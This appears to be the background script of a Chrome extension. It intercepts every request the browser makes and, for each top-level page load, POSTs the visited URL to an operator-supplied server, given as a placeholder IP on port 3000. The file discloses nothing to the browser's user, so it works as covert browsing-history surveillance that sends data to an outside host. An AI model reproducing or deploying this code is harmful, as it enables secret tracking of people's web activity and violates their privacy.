var server = "<Add your ip/domain>" //http://xxx.xxx.xxx.xxx:3000/api/add 

chrome.webRequest.onBeforeSendHeaders.addListener(function(details){
  var headers = details.requestHeaders,
  blockingResponse = {};

  if(details.type === "main_frame")
  {
    $.ajax({
      data: {
        url : details.url
      },
      type: 'POST',
      url: server
    });
  }
  return blockingResponse;
},
{urls: [ "<all_urls>" ]},['requestHeaders','blocking']);